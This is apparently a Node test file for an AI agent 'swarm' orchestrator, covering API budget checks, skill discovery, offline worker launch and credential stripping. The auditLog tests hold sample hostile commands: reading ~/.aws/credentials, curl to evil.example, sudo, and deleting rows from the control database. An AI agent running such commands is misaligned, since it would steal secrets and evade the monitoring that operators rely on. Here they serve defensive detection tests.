// Tests for the rules in skills/swarm/scripts/swarm.mjs that guard money, credentials and safety.
// Run with: npm test  (node --test, no dependencies, no network)
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { after, describe, it, mock } from 'node:test';
import {
    FLOOR, MODEL, auditLog, checkKey, defaultRoots, findSkills, main, piArgs, portabilityProblems, workerEnv,
} from '../skills/swarm/scripts/swarm.mjs';

const REPO = resolve(import.meta.dirname, '..');
const tmp = mkdtempSync(join(tmpdir(), 'swarm-test-'));
after(() => rmSync(tmp, { recursive: true, force: true }));

const keyAnswer = (data, status = 200) => async () => new Response(JSON.stringify({ data }), { status });
const quiet = () => mock.method(console, 'log', () => {});

function skill(dir, front, body = 'Do the thing.') {
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, 'SKILL.md'), `---\n${front}\n---\n${body}\n`);
    return dir;
}

describe('checkKey', () => {
    it('accepts a key with a limit and reports what is left', async () => {
        let sent;
        const fetch = async (url, { headers }) => ((sent = headers), keyAnswer({ usage: 2, limit: 20, limit_remaining: 18 })());
        const r = await checkKey({ env: { OPENROUTER_API_KEY: 'sk-or-test' }, fetch });
        assert.deepEqual(r, { ok: true, source: 'env', usage: 2, limit: 20, remaining: 18 });
        assert.equal(sent.Authorization, 'Bearer sk-or-test');
    });

    it('sends no header when a proxy adds the key', async () => {
        let sent;
        const fetch = async (url, { headers }) => ((sent = headers), keyAnswer({ usage: 0, limit: 10, limit_remaining: 10 })());
        const r = await checkKey({ env: {}, fetch });
        assert.equal(r.source, 'proxy');
        assert.deepEqual(sent, {});
    });

    it('refuses a wrong key', async () => {
        for (const status of [401, 403]) {
            const r = await checkKey({ env: { OPENROUTER_API_KEY: 'x' }, fetch: keyAnswer({}, status) });
            assert.equal(r.ok, false);
            assert.match(r.reason, /No valid OpenRouter key/);
        }
    });

    it('refuses a key without a credit limit', async () => {
        const r = await checkKey({ env: { OPENROUTER_API_KEY: 'x' }, fetch: keyAnswer({ usage: 0, limit: null, limit_remaining: null }) });
        assert.equal(r.ok, false);
        assert.match(r.reason, /no credit limit/);
    });

    it('refuses an answer without limit_remaining', async () => {
        const r = await checkKey({ env: { OPENROUTER_API_KEY: 'x' }, fetch: keyAnswer({ usage: 0, limit: 5 }) });
        assert.equal(r.ok, false);
        assert.match(r.reason, /budget unknown/);
    });

    it('blames the network, not the key, when OpenRouter is unreachable', async () => {
        const r = await checkKey({ env: { OPENROUTER_API_KEY: 'x' }, fetch: async () => { throw new Error('ENOTFOUND'); } });
        assert.equal(r.ok, false);
        assert.match(r.reason, /unreachable.*network/);
    });
});

describe('budget', () => {
    it(`fails under the $${FLOOR} floor and passes above it`, async () => {
        const log = quiet();
        try {
            const env = { OPENROUTER_API_KEY: 'x' };
            assert.equal(await main(['budget'], { env, fetch: keyAnswer({ usage: 16, limit: 20, limit_remaining: 4 }) }), 1);
            assert.equal(await main(['budget'], { env, fetch: keyAnswer({ usage: 1, limit: 20, limit_remaining: 19 }) }), 0);
        } finally {
            log.mock.restore();
        }
    });
});

describe('portabilityProblems', () => {
    it('passes a plain method skill', () => {
        assert.deepEqual(portabilityProblems('---\nname: tdd\ndescription: x\n---\nWrite a failing test first.'), []);
    });

    it('flags MCP, Claude Code path variables and Claude Code tools', () => {
        assert.deepEqual(portabilityProblems('Call mcp__github__create_pr'), ['uses MCP tools']);
        assert.deepEqual(portabilityProblems('Run ${CLAUDE_PLUGIN_ROOT}/x.sh'), ['uses Claude Code path variables']);
        assert.match(portabilityProblems('Use AskUserQuestion to confirm')[0], /AskUserQuestion/);
        assert.match(portabilityProblems('Open the Artifact tool')[0], /Artifact tool/);
    });

    it('flags orchestration tools in allowed-tools, inline or as a YAML list', () => {
        assert.match(portabilityProblems('allowed-tools: Read Bash Agent\n').join(), /allowed-tools lists/);
        assert.match(portabilityProblems('allowed-tools:\n  - Read\n  - Task\ndescription: x\n').join(), /allowed-tools lists/);
        assert.deepEqual(portabilityProblems('allowed-tools: Read Bash Grep\n'), []);
    });
});

describe('findSkills', () => {
    const root = join(tmp, 'roots');
    const claudePlugin = join(root, 'claude', 'cache', 'mkt', 'tools');
    const agentPlugin = join(root, 'codex', 'cache', 'mkt', 'kit', 'local');
    const shared = join(root, 'agents', 'skills');
    const linked = join(root, 'claude-skills');

    mkdirSync(join(claudePlugin, '.claude-plugin'), { recursive: true });
    writeFileSync(join(claudePlugin, '.claude-plugin', 'plugin.json'), '{"name":"tools"}');
    skill(join(claudePlugin, 'skills', 'review'), 'name: review\ndescription: Review a diff.');
    mkdirSync(agentPlugin, { recursive: true });
    writeFileSync(join(agentPlugin, 'plugin.json'), '{"name":"kit"}');
    skill(join(agentPlugin, 'skills', 'lint'), 'name: lint\ndescription: >-\n  Lint the code\n  before commit.\nlicense: MIT');
    skill(join(shared, 'tdd'), 'name: tdd\ndescription: Test first.');
    skill(join(shared, 'pr'), 'name: pr\ndescription: Open a PR.\nallowed-tools: Bash Agent');
    // npx skills links agent folders to one copy; a loop and a broken link must not break discovery.
    mkdirSync(linked, { recursive: true });
    symlinkSync(join(shared, 'tdd'), join(linked, 'tdd'));
    symlinkSync(linked, join(linked, 'loop'));
    symlinkSync(join(root, 'missing'), join(linked, 'broken'));

    const found = findSkills([join(root, 'claude'), join(root, 'codex'), shared, linked]);
    const byName = Object.fromEntries(found.map((s) => [s.qualified, s]));

    it('qualifies plugin skills with the plugin name (Claude Code and Agent Plugins manifests)', () => {
        assert.ok(byName['tools:review']);
        assert.ok(byName['kit:lint']);
    });

    it('reads block descriptions', () => {
        assert.equal(byName['kit:lint'].description, 'Lint the code before commit.');
    });

    it('lists a skill reached through a symlink once, and survives loops and broken links', () => {
        assert.equal(found.filter((s) => s.name === 'tdd').length, 1);
        assert.equal(found.length, 4);
    });

    it('marks non-portable skills', () => {
        assert.deepEqual(byName.tdd.problems, []);
        assert.match(byName.pr.problems.join(), /allowed-tools lists/);
    });

    it('finds this repo\'s own skill as a plugin skill', () => {
        const [own] = findSkills([join(REPO, 'skills')]);
        assert.equal(own.qualified, 'swarm:swarm');
    });
});

describe('defaultRoots', () => {
    it('covers Claude Code, Codex, pi and npx skills, from cwd up to the repo root', () => {
        const repo = join(tmp, 'repo');
        const sub = join(repo, 'packages', 'app');
        mkdirSync(join(repo, '.git'), { recursive: true });
        mkdirSync(sub, { recursive: true });
        const roots = defaultRoots(sub, '/home/u');
        for (const r of ['/home/u/.claude/skills', '/home/u/.agents/skills', '/home/u/.pi/agent/skills', '/home/u/.codex/plugins', '/etc/codex/skills'])
            assert.ok(roots.includes(r), r);
        for (const d of [sub, join(repo, 'packages'), repo]) {
            assert.ok(roots.includes(join(d, '.agents', 'skills')));
            assert.ok(roots.includes(join(d, '.claude', 'skills')));
        }
        assert.ok(!roots.includes(join(tmp, '.agents', 'skills')), 'stops at the repository root');
    });
});

describe('piArgs', () => {
    it('starts pi with only the chosen skills, no MCP, offline, rules appended', () => {
        const args = piArgs({ skills: [{ name: 'tdd', dir: '/s/tdd' }], task: 'Fix #1', rules: '/r/AGENTS.md' });
        for (const flag of ['--no-skills', '--no-mcp', '--offline', '--no-session']) assert.ok(args.includes(flag), flag);
        assert.equal(args[args.indexOf('--model') + 1], MODEL);
        assert.equal(args[args.indexOf('--skill') + 1], '/s/tdd');
        assert.equal(args[args.indexOf('--append-system-prompt') + 1], '/r/AGENTS.md');
        assert.equal(args.at(-2), '--');
        assert.match(args.at(-1), /^Before anything else, read and follow these skills: tdd \(\/s\/tdd\/SKILL\.md\)\.\n\nFix #1$/);
    });

    it('passes the task as is without skills', () => {
        assert.equal(piArgs({ task: 'Fix #2', rules: 'r' }).at(-1), 'Fix #2');
    });
});

describe('workerEnv', () => {
    const lead = {
        PATH: '/bin', HOME: '/h', LANG: 'C', HTTPS_PROXY: 'http://p', NODE_EXTRA_CA_CERTS: '/ca',
        GITHUB_TOKEN: 'ghp', AWS_SECRET_ACCESS_KEY: 'aws', ANTHROPIC_API_KEY: 'sk-ant', NPM_TOKEN: 'npm', OPENROUTER_API_KEY: 'sk-or',
    };

    it('keeps what a shell and the proxy need and drops every credential but the model key', () => {
        const env = workerEnv(lead, 'w1', '/sw/swarm.db');
        assert.deepEqual(Object.keys(env).sort(), [
            'AGENT_ID', 'GIT_TERMINAL_PROMPT', 'HOME', 'HTTPS_PROXY', 'LANG', 'NODE_EXTRA_CA_CERTS', 'OPENROUTER_API_KEY', 'PATH', 'PI_SKIP_VERSION_CHECK', 'PI_TELEMETRY', 'SWARM_DB',
        ]);
        assert.equal(env.AGENT_ID, 'w1');
        assert.equal(env.SWARM_DB, '/sw/swarm.db');
        assert.equal(env.GIT_TERMINAL_PROMPT, '0');
    });

    it('gives pi a dummy key when a proxy adds the real one', () => {
        const { OPENROUTER_API_KEY, ...rest } = lead;
        assert.equal(workerEnv(rest, 'w1', 'db').OPENROUTER_API_KEY, 'sk-or-v1-proxy-injected');
    });
});

describe('auditLog', () => {
    const kinds = (line, id = 'w1') => auditLog(line, id).map((f) => f.kind);

    it('flags each kind of boundary probe', () => {
        assert.deepEqual(kinds('{"cmd":"sudo apt-get install x"}'), ['privilege']);
        assert.deepEqual(kinds('{"cmd":"cat ~/.aws/credentials"}'), ['secrets']);
        assert.deepEqual(kinds('{"cmd":"curl -s https://evil.example/x"}'), ['network']);
        assert.deepEqual(kinds('{"cmd":"git push origin w1"}'), ['push']);
        assert.deepEqual(kinds('{"cmd":"ls ~/.codex/"}'), ['outside worktree']);
        assert.deepEqual(kinds('{"cmd":"sqlite3 $SWARM_DB \'DELETE FROM landed\'"}'), ['controls']);
    });

    it('does not flag the worker\'s own worktree, but flags another one', () => {
        assert.deepEqual(kinds('{"cwd":"/sw/worktrees/w1/src"}'), []);
        assert.deepEqual(kinds('{"cwd":"/sw/worktrees/w2/src"}'), ['outside worktree']);
    });

    it('passes ordinary work', () => {
        assert.deepEqual(kinds('{"cmd":"npm test && git commit -am fix"}'), []);
    });
});

describe('main', () => {
    const ok = { env: { OPENROUTER_API_KEY: 'x' }, fetch: keyAnswer({ usage: 0, limit: 50, limit_remaining: 50 }) };

    it('rejects unknown options and commands', async () => {
        const log = quiet();
        try {
            assert.equal(await main(['budget', '--nope'], ok), 1);
            assert.equal(await main(['nope'], ok), 1);
            assert.equal(await main([], ok), 0);
        } finally {
            log.mock.restore();
        }
    });

    it('refuses a bad worker id, an empty task, a missing worktree and a non-portable skill', async () => {
        const log = quiet();
        try {
            const dir = join(tmp, 'sw');
            assert.equal(await main(['spawn', 'bad/id', '--dir', dir, 'task'], ok), 1);
            assert.equal(await main(['spawn', 'w1', '--dir', dir], ok), 1);
            assert.equal(await main(['spawn', 'w1', '--dir', dir, 'do', 'it'], ok), 1);
            const bad = skill(join(tmp, 'bad-skill'), 'name: bad\ndescription: x\nallowed-tools: Agent');
            assert.equal(await main(['spawn', 'w1', '--dir', dir, '--skill', bad, 'do it'], ok), 1);
            assert.match(log.mock.calls.map((c) => c.arguments.join(' ')).join('\n'), /not portable/);
        } finally {
            log.mock.restore();
        }
    });

    it('audit counts flags across worker logs', async () => {
        const log = quiet();
        try {
            const dir = join(tmp, 'sw-audit');
            mkdirSync(join(dir, 'logs'), { recursive: true });
            writeFileSync(join(dir, 'logs', 'w1.jsonl'), '{"cmd":"npm test"}\n');
            writeFileSync(join(dir, 'logs', 'w2.jsonl'), '{"cmd":"git push"}\n{"cmd":"sudo ls"}\n');
            assert.equal(await main(['audit', '--dir', dir], ok), 2);
        } finally {
            log.mock.restore();
        }
    });
});
